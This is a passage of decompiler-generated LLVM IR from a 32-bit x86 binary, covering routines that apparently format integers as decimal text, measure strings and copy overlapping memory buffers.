  store i32 %v7_8054f16, i32* %edx.global-to-local, align 4
  %v0_8054f1d = load i32, i32* %esi.global-to-local, align 4
  %v2_8054f1d = icmp slt i32 %v0_8054f1d, 0
  %v1_8054f1f = trunc i32 %stack_var_-42.0 to i8
  br i1 %v2_8054f1d, label %dec_label_pc_8054f2e, label %dec_label_pc_8054f37

dec_label_pc_8054f2e:                             ; preds = %dec_label_pc_8054f16
  store i32 %v0_8054f1d, i32* %edx.global-to-local, align 4
  %v1_8054f30 = sub i32 0, %v0_8054f1d
  br label %dec_label_pc_8054f37

dec_label_pc_8054f37:                             ; preds = %dec_label_pc_8054f16, %dec_label_pc_8054f2e
  %storemerge26 = phi i32 [ %v1_8054f30, %dec_label_pc_8054f2e ], [ %v0_8054f1d, %dec_label_pc_8054f16 ]
  %storemerge8 = phi i8 [ 45, %dec_label_pc_8054f2e ], [ 43, %dec_label_pc_8054f16 ]
  store i32 %storemerge26, i32* %edx.global-to-local, align 4
  store i32 0, i32* %stack_var_-27, align 4
  %v2_8054f3f = ptrtoint i32* %stack_var_-27 to i32
  store i32 %v2_8054f3f, i32* %ebx.global-to-local, align 4
  store i32 2, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8054f4b

dec_label_pc_8054f4b:                             ; preds = %dec_label_pc_8054f4b.backedge, %dec_label_pc_8054f37
  %v0_8054f56 = phi i32 [ %v0_8054f56.pre, %dec_label_pc_8054f4b.backedge ], [ %v2_8054f3f, %dec_label_pc_8054f37 ]
  %v0_8054f53 = phi i32 [ %v0_8054f53.pre, %dec_label_pc_8054f4b.backedge ], [ 2, %dec_label_pc_8054f37 ]
  %v0_8054f4b = phi i32 [ %v9_8054f54, %dec_label_pc_8054f4b.backedge ], [ %storemerge26, %dec_label_pc_8054f37 ]
  %v1_8054f52 = ashr i32 %v0_8054f4b, 31
  %v1_8054f53 = add i32 %v0_8054f53, 1
  store i32 %v1_8054f53, i32* %edi.global-to-local, align 4
  %v2_8054f54 = zext i32 %v0_8054f4b to i64
  %v4_8054f54 = zext i32 %v1_8054f52 to i64
  %v5_8054f54 = mul nuw i64 %v4_8054f54, 4294967296
  %v6_8054f54 = or i64 %v5_8054f54, %v2_8054f54
  %v8_8054f54 = sdiv i64 %v6_8054f54, 10
  %v9_8054f54 = trunc i64 %v8_8054f54 to i32
  %v10_8054f54 = srem i64 %v6_8054f54, 10
  %v1_8054f56 = add i32 %v0_8054f56, -1
  store i32 %v1_8054f56, i32* %ebx.global-to-local, align 4
  store i32 %v9_8054f54, i32* %esi.global-to-local, align 4
  %v3_8054f59 = and i32 %v9_8054f54, -256
  %v1_8054f5b = trunc i64 %v10_8054f54 to i8
  %v2_8054f5b = add i8 %v1_8054f5b, 48
  %v12_8054f5b = zext i8 %v2_8054f5b to i32
  %v15_8054f5b = or i32 %v12_8054f5b, %v3_8054f59
  store i32 %v15_8054f5b, i32* %eax.global-to-local, align 4
  %v3_8054f60 = inttoptr i32 %v1_8054f56 to i8*
  store i8 %v2_8054f5b, i8* %v3_8054f60, align 1
  store i32 %v9_8054f54, i32* %edx.global-to-local, align 4
  %v7_8054f64 = icmp sgt i32 %v1_8054f53, 3
  br i1 %v7_8054f64, label %dec_label_pc_8054f66, label %dec_label_pc_8054f4b.backedge

dec_label_pc_8054f66:                             ; preds = %dec_label_pc_8054f4b
  %v2_8054f66 = icmp eq i32 %v9_8054f54, 0
  %v1_8054f68 = icmp eq i1 %v2_8054f66, false
  br i1 %v1_8054f68, label %dec_label_pc_8054f4b.backedge, label %dec_label_pc_8054f6a

dec_label_pc_8054f4b.backedge:                    ; preds = %dec_label_pc_8054f66, %dec_label_pc_8054f4b
  %v0_8054f53.pre = load i32, i32* %edi.global-to-local, align 4
  %v0_8054f56.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054f4b

dec_label_pc_8054f6a:                             ; preds = %dec_label_pc_8054f66
  %v4_8054f6a = zext i8 %storemerge8 to i32
  %v7_8054f6a = or i32 %v3_8054f59, %v4_8054f6a
  store i32 %v7_8054f6a, i32* %edx.global-to-local, align 4
  %v0_8054f6e = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054f6e = add i32 %v0_8054f6e, -2
  store i32 %v1_8054f6e, i32* %eax.global-to-local, align 4
  %v3_8054f71 = add i32 %v0_8054f6e, -1
  %v4_8054f71 = inttoptr i32 %v3_8054f71 to i8*
  store i8 %storemerge8, i8* %v4_8054f71, align 1
  %v5_8054f74 = load i32, i32* %edx.global-to-local, align 4
  %v6_8054f74 = and i32 %v5_8054f74, -256
  %v7_8054f74 = or i32 %v6_8054f74, %stack_var_-42.0
  store i32 %v7_8054f74, i32* %edx.global-to-local, align 4
  %v2_8054f78 = load i32, i32* %ebx.global-to-local, align 4
  %v3_8054f78 = add i32 %v2_8054f78, -2
  %v4_8054f78 = inttoptr i32 %v3_8054f78 to i8*
  store i8 %v1_8054f1f, i8* %v4_8054f78, align 1
  %v0_8054f7b = load i32, i32* @ecx, align 4
  %v1_8054f7b = inttoptr i32 %v0_8054f7b to i32*
  store i32 112, i32* %v1_8054f7b, align 4
  %v0_8054f81 = load i32, i32* %edi.global-to-local, align 4
  %v1_8054f81 = load i32, i32* @ecx, align 4
  %v2_8054f81 = add i32 %v1_8054f81, 4
  %v3_8054f81 = inttoptr i32 %v2_8054f81 to i32*
  store i32 %v0_8054f81, i32* %v3_8054f81, align 4
  %v0_8054f84 = load i32, i32* %eax.global-to-local, align 4
  %v1_8054f84 = load i32, i32* @ecx, align 4
  %v2_8054f84 = add i32 %v1_8054f84, 8
  %v3_8054f84 = inttoptr i32 %v2_8054f84 to i32*
  store i32 %v0_8054f84, i32* %v3_8054f84, align 4
  %v0_8054f87 = load i32, i32* @ecx, align 4
  %v1_8054f87 = add i32 %v0_8054f87, 12
  store i32 %v1_8054f87, i32* @ecx, align 4
  br label %dec_label_pc_8054f8a

dec_label_pc_8054f8a:                             ; preds = %dec_label_pc_8054f0f, %dec_label_pc_8054bb9, %dec_label_pc_8054f6a
  %v0_8055009 = phi i32 [ %v1_8054f97120, %dec_label_pc_8054f0f ], [ %v2_8054bc1, %dec_label_pc_8054bb9 ], [ %v1_8054f87, %dec_label_pc_8054f6a ]
  %v2_8054f8a = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_8054f8a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054f8e

dec_label_pc_8054f8e:                             ; preds = %dec_label_pc_8054f8e, %dec_label_pc_8054f8a
  %v0_8054f8e = phi i32 [ %v2_8054f8a, %dec_label_pc_8054f8a ], [ %v1_8054f90, %dec_label_pc_8054f8e ]
  %stack_var_-216.0 = phi i32 [ %v3_8054abb, %dec_label_pc_8054f8a ], [ %v5_8054f93, %dec_label_pc_8054f8e ]
  %v1_8054f8e = inttoptr i32 %v0_8054f8e to i32*
  %v2_8054f8e = load i32, i32* %v1_8054f8e, align 4
  store i32 %v2_8054f8e, i32* %ebx.global-to-local, align 4
  %v1_8054f90 = add i32 %v0_8054f8e, 12
  store i32 %v1_8054f90, i32* %eax.global-to-local, align 4
  %v5_8054f93 = sub i32 %stack_var_-216.0, %v2_8054f8e
  %v7_8054f97 = icmp ult i32 %v1_8054f90, %v0_8055009
  br i1 %v7_8054f97, label %dec_label_pc_8054f8e, label %dec_label_pc_8054f9b

dec_label_pc_8054f9b:                             ; preds = %dec_label_pc_8054f8e
  store i32 %v0_8055009, i32* %esi.global-to-local, align 4
  %v5_8054fae = icmp eq i8 %stack_var_-26.0, 0
  store i32 160, i32* %stack_var_-168, align 4
  %v1_8054fbe = icmp eq i1 %v5_8054fae, false
  %v2_8054fbe = zext i1 %v1_8054fbe to i32
  store i32 %v2_8054fbe, i32* %edx.global-to-local, align 4
  %v2_8054fc1 = sub i32 %v5_8054f93, %v2_8054fbe
  store i32 %v2_8054fc1, i32* %eax.global-to-local, align 4
  %tmp189 = icmp slt i32 %v2_8054fc1, 1
  br i1 %tmp189, label %dec_label_pc_805500b, label %dec_label_pc_8054fcb

dec_label_pc_8054fcb:                             ; preds = %dec_label_pc_8054f9b
  store i32 %tmp155, i32* %edx.global-to-local, align 4
  %v2_8054fd2 = inttoptr i32 %v1_8054afb to i8*
  %v3_8054fd2 = load i8, i8* %v2_8054fd2, align 1
  %v4_8054fd2 = and i8 %v3_8054fd2, 8
  %v5_8054fd2 = icmp eq i8 %v4_8054fd2, 0
  br i1 %v5_8054fd2, label %dec_label_pc_8054fed, label %dec_label_pc_8054fd8

dec_label_pc_8054fd8:                             ; preds = %dec_label_pc_8054fcb
  %v1_8054fd8 = add i32 %v0_8055009, 12
  store i32 %v1_8054fd8, i32* %esi.global-to-local, align 4
  %v1_8054fdb = inttoptr i32 %v0_8055009 to i32*
  store i32 160, i32* %v1_8054fdb, align 4
  %v1_8054fe1 = load i32, i32* @ecx, align 4
  %v2_8054fe1 = add i32 %v1_8054fe1, 4
  %v3_8054fe1 = inttoptr i32 %v2_8054fe1 to i32*
  store i32 %v2_8054fc1, i32* %v3_8054fe1, align 4
  %v0_8054fe4 = load i32, i32* @ecx, align 4
  %v1_8054fe4 = add i32 %v0_8054fe4, 8
  %v2_8054fe4 = inttoptr i32 %v1_8054fe4 to i32*
  store i32 ptrtoint (i32* @global_var_805d313.397 to i32), i32* %v2_8054fe4, align 4
  br label %dec_label_pc_805500b

dec_label_pc_8054fed:                             ; preds = %dec_label_pc_8054fcb
  store i32 %tmp155, i32* %ebx.global-to-local, align 4
  %v1_8054ff4 = add i32 %tmp155, 16
  %v2_8054ff4 = inttoptr i32 %v1_8054ff4 to i32*
  %v3_8054ff4 = load i32, i32* %v2_8054ff4, align 4
  %v9_8054ff4 = icmp eq i32 %v3_8054ff4, 48
  %v1_8054ff8 = icmp eq i1 %v9_8054ff4, false
  br i1 %v1_8054ff8, label %dec_label_pc_8055005, label %dec_label_pc_8054ffa

dec_label_pc_8054ffa:                             ; preds = %dec_label_pc_8054fed
  %v3_8054ffa = load i32, i32* %stack_var_-152, align 4
  %v5_8054ffa = add i32 %v3_8054ffa, %v2_8054fc1
  store i32 %v5_8054ffa, i32* %stack_var_-152, align 4
  br label %dec_label_pc_8055009

dec_label_pc_8055000:                             ; preds = %dec_label_pc_8055011
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8055038

dec_label_pc_8055005:                             ; preds = %dec_label_pc_8054fed
  br label %dec_label_pc_8055009

dec_label_pc_8055009:                             ; preds = %dec_label_pc_8054ffa, %dec_label_pc_8055005
  store i32 %v0_8055009, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805500b

dec_label_pc_805500b:                             ; preds = %dec_label_pc_8054f9b, %dec_label_pc_8054fd8, %dec_label_pc_8055009
  store i32 0, i32* %edi.global-to-local, align 4
  %v2_805500d = ptrtoint i32* %stack_var_-168 to i32
  store i32 %v2_805500d, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8055011

dec_label_pc_8055011:                             ; preds = %dec_label_pc_805502f, %dec_label_pc_805500b
  call void @__pseudo_call(i32 %tmp155)
  %v1_805502a = load i32, i32* %ebx.global-to-local, align 4
  %v2_805502a = add i32 %v1_805502a, 4
  %v3_805502a = inttoptr i32 %v2_805502a to i32*
  %v4_805502a = load i32, i32* %v3_805502a, align 4
  %v15_805502a = icmp eq i32 %v2_8054fc1, %v4_805502a
  %v1_805502d = icmp eq i1 %v15_805502a, false
  br i1 %v1_805502d, label %dec_label_pc_8055000, label %dec_label_pc_805502f

dec_label_pc_805502f:                             ; preds = %dec_label_pc_8055011
  %v1_805502f = add i32 %v1_805502a, 12
  store i32 %v1_805502f, i32* %ebx.global-to-local, align 4
  %v0_8055032 = load i32, i32* %edi.global-to-local, align 4
  %v2_8055032 = add i32 %v0_8055032, %v2_8054fc1
  store i32 %v2_8055032, i32* %edi.global-to-local, align 4
  %v1_8055034 = load i32, i32* %esi.global-to-local, align 4
  %v7_8055034 = icmp ult i32 %v1_805502f, %v1_8055034
  br i1 %v7_8055034, label %dec_label_pc_8055011, label %dec_label_pc_8055038

dec_label_pc_8055038:                             ; preds = %dec_label_pc_805502f, %dec_label_pc_8055000
  %v0_805503e = phi i32 [ -1, %dec_label_pc_8055000 ], [ %v2_8055032, %dec_label_pc_805502f ]
  store i32 %v0_805503e, i32* %eax.global-to-local, align 4
  %v2_8055041 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8055041, i32* @esi, align 4
  store i32 %v0_8054a9e, i32* @edi, align 4
  store i32 %v0_8054a9d, i32* @ebp, align 4
  ret i32 %v0_805503e

; uselistorder directives
  uselistorder i32 %v0_805503e, { 1, 0 }
  uselistorder i32 %v2_8054fc1, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32 %v2_8054fbe, { 1, 0 }
  uselistorder i32 %v1_8054f90, { 1, 2, 0 }
  uselistorder i32 %v0_8054f8e, { 1, 0 }
  uselistorder i32 %v0_8055009, { 1, 3, 2, 4, 0 }
  uselistorder i32 %v9_8054f54, { 3, 2, 1, 0, 4 }
  uselistorder i8 %storemerge8, { 1, 0 }
  uselistorder i32 %v0_8054f1d, { 2, 1, 0, 3 }
  uselistorder i32 %v2_8054ef6, { 1, 0 }
  uselistorder i32 %v1_8054ef6, { 1, 0, 2 }
  uselistorder i32 %v2_8054ef4, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_8054eb1, { 1, 0 }
  uselistorder i32 %v2_8054e1e, { 2, 1, 3, 0 }
  uselistorder i32 %v2_8054e18, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_8054e75, { 4, 0, 3, 1, 2, 5, 6, 7 }
  uselistorder i32 %v1_8054db4, { 1, 0 }
  uselistorder i32 %v0_8054daf, { 1, 2, 0, 3 }
  uselistorder i32 %v2_8054d7c, { 1, 2, 3, 0, 4 }
  uselistorder i8 %v2_8054d77, { 1, 0 }
  uselistorder i8 %v2_8054d70, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v0_8054d70, { 1, 0, 3, 2 }
  uselistorder i32 %stack_var_-220.3, { 1, 0 }
  uselistorder i32 %v0_8054cfa, { 1, 2, 0 }
  uselistorder i32 %stack_var_-42.0, { 0, 2, 1 }
  uselistorder i8 %stack_var_-207.1, { 4, 3, 1, 5, 0, 2 }
  uselistorder i8 %v4_8054cdf, { 1, 0 }
  uselistorder i32 %tmp194, { 3, 1, 2, 0 }
  uselistorder x86_fp80 %v3_8054caa, { 1, 0 }
  uselistorder i32 %v2_8054c63, { 2, 1, 0 }
  uselistorder i32 %v0_8054d19, { 1, 2, 0, 3 }
  uselistorder x86_fp80 %v1_8054c35, { 1, 0 }
  uselistorder x86_fp80 %v3_8054c17, { 2, 0, 1, 3, 6, 7, 5, 8, 4, 9, 10 }
  uselistorder i32 %v3_8054c14, { 1, 0 }
  uselistorder x86_fp80 %v4_8054bfc, { 2, 0, 1, 3, 4 }
  uselistorder x86_fp80 %v3_8054bf6, { 1, 2, 0 }
  uselistorder i32 %v3_8054bf3, { 1, 0 }
  uselistorder i32 %v1_8054bec, { 3, 0, 1, 2 }
  uselistorder i32 %stack_var_-220.0, { 2, 0, 1 }
  uselistorder x86_fp80 %v1_8054c25, { 8, 1, 2, 5, 3, 4, 6, 0, 7, 9 }
  uselistorder x86_fp80 %v2_8054bed, { 1, 0 }
  uselistorder i8 %v4_8054b9d, { 1, 0 }
  uselistorder i3 %v1_8054b3a, { 1, 0, 2 }
  uselistorder i8 %stack_var_-207.0, { 3, 2, 0, 4, 5, 1, 6, 7 }
  uselistorder i8 %v3_8054ac2, { 1, 0, 2, 3 }
  uselistorder i32 %v3_8054abb, { 1, 0, 2 }
  uselistorder i3 %v4_8054ab4, { 0, 2, 1, 3 }
  uselistorder i32* %stack_var_-144, { 1, 0, 2 }
  uselistorder i32* %stack_var_-72, { 1, 0, 2 }
  uselistorder i32* %stack_var_-71, { 1, 0 }
  uselistorder i32* %stack_var_-132, { 2, 0, 1 }
  uselistorder i32* %stack_var_-27, { 1, 0 }
  uselistorder i32* %stack_var_-152, { 0, 1, 4, 2, 3 }
  uselistorder i32* %stack_var_-168, { 1, 0 }
  uselistorder i32 %tmp155, { 14, 13, 12, 11, 10, 9, 8, 7, 0, 6, 1, 2, 3, 5, 4 }
  uselistorder x86_fp80 %tmp154, { 3, 2, 1, 0, 4, 5 }
  uselistorder x86_fp80* %st1.global-to-local, { 9, 10, 11, 12, 0, 4, 2, 3, 7, 5, 1, 6, 8 }
  uselistorder x86_fp80* %st0.global-to-local, { 2, 5, 6, 0, 3, 4, 7, 8, 1 }
  uselistorder i3* %fpu_stat_TOP.global-to-local, { 0, 4, 5, 6, 7, 8, 1, 9, 10, 2, 3 }
  uselistorder i32* %esi.global-to-local, { 2, 0, 1, 3, 4, 7, 6, 8, 5, 9, 10, 11, 12 }
  uselistorder i32* %edx.global-to-local, { 1, 2, 3, 4, 5, 6, 28, 7, 8, 11, 13, 12, 14, 9, 10, 15, 18, 16, 19, 17, 20, 21, 22, 23, 24, 0, 25, 26, 27 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 3, 1, 4, 5, 6, 7, 9, 8, 10 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 26, 12, 13, 27, 14, 15, 16, 17, 21, 22, 18, 19, 20, 23, 24, 25, 28, 29 }
  uselistorder i32* %ebp.global-to-local, { 0, 1, 5, 6, 2, 7, 4, 3, 8, 9, 10 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 2, 3, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i64 10, { 1, 0, 2 }
  uselistorder i8 45, { 1, 3, 0, 2 }
  uselistorder i32 165, { 1, 0 }
  uselistorder i32 21, { 1, 2, 0 }
  uselistorder i8 102, { 2, 3, 1, 0 }
  uselistorder i8 103, { 1, 2, 0 }
  uselistorder i32 69, { 1, 2, 0 }
  uselistorder x86_fp80 0xK401CEE6B280000000000, { 1, 2, 0 }
  uselistorder i32 13, { 1, 4, 3, 2, 0 }
  uselistorder x86_fp80 0xK3FFD8000000000000000, { 1, 0, 2, 3 }
  uselistorder x86_fp80 0xK00000000000000000000, { 0, 2, 3, 4, 1 }
  uselistorder i8 6, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805500b, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8055009, { 1, 0 }
  uselistorder label %dec_label_pc_8054f8a, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8054f37, { 1, 0 }
  uselistorder label %dec_label_pc_8054f0f, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8054ede, { 1, 0 }
  uselistorder label %dec_label_pc_8054ecb, { 1, 0 }
  uselistorder label %dec_label_pc_8054eb1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8054e7e, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8054e69, { 1, 0 }
  uselistorder label %dec_label_pc_8054e5e, { 1, 0 }
  uselistorder label %dec_label_pc_8054de5, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8054dd7, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8054d9d, { 1, 0 }
  uselistorder label %dec_label_pc_8054d6d.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_8054d39, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8054d08, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8054cf3, { 1, 0 }
  uselistorder label %dec_label_pc_8054c5f, { 1, 0 }
  uselistorder label %dec_label_pc_8054c37, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8054c35, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8054c25, { 1, 0 }
  uselistorder label %dec_label_pc_8054bb9, { 1, 0 }
  uselistorder label %dec_label_pc_8054ae2, { 1, 0 }
}

define i32 @function_8055048(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8055048:
  %stack_var_-28 = alloca i32, align 4
  %v12_805504b = ptrtoint i32* %stack_var_-28 to i32
  %v4_805504e = ptrtoint i16* %arg1 to i32
  store i32 %v4_805504e, i32* @esi, align 4
  %v1_8055052 = add i32 %v4_805504e, 52
  %v2_8055052 = inttoptr i32 %v1_8055052 to i32*
  %v3_8055052 = load i32, i32* %v2_8055052, align 4
  store i32 %v3_8055052, i32* @edi, align 4
  %v1_8055055 = icmp eq i32 %v3_8055052, 0
  %v1_8055057 = icmp eq i1 %v1_8055055, false
  br i1 %v1_8055057, label %dec_label_pc_8055078, label %dec_label_pc_8055059

dec_label_pc_8055059:                             ; preds = %dec_label_pc_8055048
  %v1_8055059 = add i32 %v4_805504e, 56
  store i32 %v1_8055059, i32* @ebx, align 4
  store i32 %v12_805504b, i32* @eax, align 4
  %v3_8055068 = call i32 @function_805405a(i32 %v12_805504b, i32 134561879)
  %v0_805506d = load i32, i32* @ebx, align 4
  %v2_8055070 = call i32 @function_8054057(i32 %v0_805506d)
  %v0_8055078.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8055078

dec_label_pc_8055078:                             ; preds = %dec_label_pc_8055048, %dec_label_pc_8055059
  %v0_8055091 = phi i32 [ %v4_805504e, %dec_label_pc_8055048 ], [ %v0_8055078.pre, %dec_label_pc_8055059 ]
  %v1_8055078 = inttoptr i32 %v0_8055091 to i16*
  %v2_8055078 = load i16, i16* %v1_8055078, align 2
  %v1_805507b = and i16 %v2_8055078, 192
  %v6_8055080 = icmp eq i16 %v1_805507b, 192
  br i1 %v6_8055080, label %dec_label_pc_8055078.dec_label_pc_805509e_crit_edge, label %dec_label_pc_8055087

dec_label_pc_8055078.dec_label_pc_805509e_crit_edge: ; preds = %dec_label_pc_8055078
  br label %dec_label_pc_805509e

dec_label_pc_8055087:                             ; preds = %dec_label_pc_8055078
  %v0_8055087 = load i32, i32* @ecx, align 4
  store i32 -1, i32* @ebx, align 4
  %v6_8055092 = call i32 @function_805488c(i16* %v1_8055078, i32 128, i32 %v0_8055087, i32 %v0_8055087)
  %v1_805509a = icmp eq i32 %v6_8055092, 0
  %v1_805509c = icmp eq i1 %v1_805509a, false
  br i1 %v1_805509c, label %dec_label_pc_80550b2, label %dec_label_pc_8055087.dec_label_pc_805509e_crit_edge

dec_label_pc_8055087.dec_label_pc_805509e_crit_edge: ; preds = %dec_label_pc_8055087
  %v0_80550a7.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805509e

dec_label_pc_805509e:                             ; preds = %dec_label_pc_8055078.dec_label_pc_805509e_crit_edge, %dec_label_pc_8055087.dec_label_pc_805509e_crit_edge
  %v0_80550a7 = phi i32 [ %v0_8055091, %dec_label_pc_8055078.dec_label_pc_805509e_crit_edge ], [ %v0_80550a7.pre, %dec_label_pc_8055087.dec_label_pc_805509e_crit_edge ]
  %v4_80550a8 = inttoptr i32 %arg2 to i8*
  %v5_80550a8 = call i32 @function_8051238(i32 %v0_80550a7, i8* %v4_80550a8, i32 %arg3)
  store i32 %v5_80550a8, i32* @ebx, align 4
  br label %dec_label_pc_80550b2

dec_label_pc_80550b2:                             ; preds = %dec_label_pc_8055087, %dec_label_pc_805509e
  br i1 %v1_8055057, label %dec_label_pc_80550c7, label %dec_label_pc_80550b6

dec_label_pc_80550b6:                             ; preds = %dec_label_pc_80550b2
  store i32 %v12_805504b, i32* @eax, align 4
  %v3_80550bf = call i32 @function_805405a(i32 %v12_805504b, i32 1)
  br label %dec_label_pc_80550c7

dec_label_pc_80550c7:                             ; preds = %dec_label_pc_80550b2, %dec_label_pc_80550b6
  %v0_80550ca = load i32, i32* @ebx, align 4
  ret i32 %v0_80550ca

; uselistorder directives
  uselistorder i32 %v12_805504b, { 2, 3, 0, 1 }
  uselistorder i32 (i32, i8*, i32)* @function_8051238, { 1, 0 }
  uselistorder i32 (i16*, i32, i32, i32)* @function_805488c, { 1, 0 }
  uselistorder label %dec_label_pc_80550c7, { 1, 0 }
  uselistorder label %dec_label_pc_80550b2, { 1, 0 }
  uselistorder label %dec_label_pc_805509e, { 1, 0 }
  uselistorder label %dec_label_pc_8055078, { 1, 0 }
}

define i32 @function_80550d0(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80550d0:
  %edi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-4 = alloca i32, align 4
  %v0_80550d0 = load i32, i32* @edi, align 4
  store i32 %v0_80550d0, i32* %stack_var_-4, align 4
  store i32 %arg3, i32* @ecx, align 4
  %v4_80550d7 = ptrtoint i8* %arg1 to i32
  store i32 %v4_80550d7, i32* %edi.global-to-local, align 4
  %v1_80550df = icmp eq i32 %arg3, 0
  store i1 %v1_80550df, i1* %zf.global-to-local, align 1
  br i1 %v1_80550df, label %dec_label_pc_80550ef, label %dec_label_pc_80550e3

dec_label_pc_80550e3:                             ; preds = %dec_label_pc_80550d0
  %v2_80550e3 = call i32 @_strlen(i8* %arg1)
  %v3_80550e3 = mul i32 %v2_80550e3, -1
  %v4_80550e3 = add i32 %v3_80550e3, -2
  store i32 %v4_80550e3, i32* @ecx, align 4
  %v0_80550e5 = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_80550e5, label %dec_label_pc_80550e3.dec_label_pc_80550ec_crit_edge, label %dec_label_pc_80550e7

dec_label_pc_80550e3.dec_label_pc_80550ec_crit_edge: ; preds = %dec_label_pc_80550e3
  %v0_80550ec.pre = load i32, i32* %edi.global-to-local, align 4
  %phitmp = add i32 %v0_80550ec.pre, -1
  br label %dec_label_pc_80550ec

dec_label_pc_80550e7:                             ; preds = %dec_label_pc_80550e3
  store i32 1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_80550ec

dec_label_pc_80550ec:                             ; preds = %dec_label_pc_80550e3.dec_label_pc_80550ec_crit_edge, %dec_label_pc_80550e7
  %v0_80550ec = phi i32 [ %phitmp, %dec_label_pc_80550e3.dec_label_pc_80550ec_crit_edge ], [ 0, %dec_label_pc_80550e7 ]
  %v8_80550ec = icmp eq i32 %v0_80550ec, 0
  store i1 %v8_80550ec, i1* %zf.global-to-local, align 1
  store i32 %v0_80550ec, i32* %edi.global-to-local, align 4
  %v2_80550ef.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80550ef

dec_label_pc_80550ef:                             ; preds = %dec_label_pc_80550d0, %dec_label_pc_80550ec
  %v0_80550f0 = phi i32 [ 0, %dec_label_pc_80550d0 ], [ %v0_80550ec, %dec_label_pc_80550ec ]
  %v2_80550ef = phi i32 [ %v0_80550d0, %dec_label_pc_80550d0 ], [ %v2_80550ef.pre, %dec_label_pc_80550ec ]
  store i32 %v2_80550ef, i32* @edi, align 4
  ret i32 %v0_80550f0

; uselistorder directives
  uselistorder i32 %v0_80550ec, { 2, 0, 1 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_80550ef, { 1, 0 }
  uselistorder label %dec_label_pc_80550ec, { 1, 0 }
}

define i32 @function_80550f4(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_80550f4:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = inttoptr i32 %arg2 to i8*
  %v4_80550f6 = ptrtoint i8* %arg1 to i32
  %v9_8055102 = icmp ugt i8* %tmp4, %arg1
  %v1_8055104 = icmp eq i1 %v9_8055102, false
  br i1 %v1_8055104, label %dec_label_pc_805510c, label %dec_label_pc_8055106

dec_label_pc_8055106:                             ; preds = %dec_label_pc_80550f4
  %v7_8055108 = call i8* @_memcpy(i8* %arg1, i8* %tmp4, i32 %tmp)
  br label %dec_label_pc_8055118

dec_label_pc_805510c:                             ; preds = %dec_label_pc_80550f4
  %v3_805510c = add i32 %arg2, -1
  %v4_805510c = add i32 %v3_805510c, %tmp
  %v5_805510c = inttoptr i32 %v4_805510c to i8*
  %v3_8055110 = add i32 %v4_80550f6, -1
  %v4_8055110 = add i32 %v3_8055110, %tmp
  %v5_8055110 = inttoptr i32 %v4_8055110 to i8*
  %v7_8055115 = call i8* @_memcpy(i8* %v5_8055110, i8* %v5_805510c, i32 %tmp)
  br label %dec_label_pc_8055118

dec_label_pc_8055118:                             ; preds = %dec_label_pc_8055106, %dec_label_pc_805510c
  ret i32 %v4_80550f6

; uselistorder directives
  uselistorder i8* %tmp4, { 1, 0 }
  uselistorder i32 %tmp, { 0, 1, 3, 2 }
  uselistorder i8* %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8055118, { 1, 0 }
}

define i32 @function_805511c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_805511c:
  %v0_805511c = load i32, i32* @esi, align 4
  store i32 %arg1, i32* @esi, align 4
  %v3_805512f = inttoptr i32 %arg1 to i16*
  %v4_805512f = call i32 @function_8051e5c(i16* %v3_805512f, i32 %arg2, i32 %arg3)
  %v0_8055137 = load i32, i32* @esi, align 4
  %v2_8055137 = add i32 %v0_8055137, %arg3
  store i32 %v0_805511c, i32* @esi, align 4
  ret i32 %v2_8055137
}

define i32 @function_8055140(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8055140:
  %tmp = trunc i32 %arg2 to i8
  %v4_8055145 = urem i32 %arg2, 256
  %v4_8055151 = sext i8 %arg1 to i32
  %v2_8055155 = add i32 %v4_8055151, %arg3
  %v1_80551676 = icmp eq i32 %arg3, 0
  br i1 %v1_80551676, label %dec_label_pc_805516f, label %dec_label_pc_805516b

dec_label_pc_8055159:                             ; preds = %dec_label_pc_805516b
  %v1_8055159 = add i32 %v0_8055159, -1
  %v5_805515a = load i32, i32* @edx, align 4
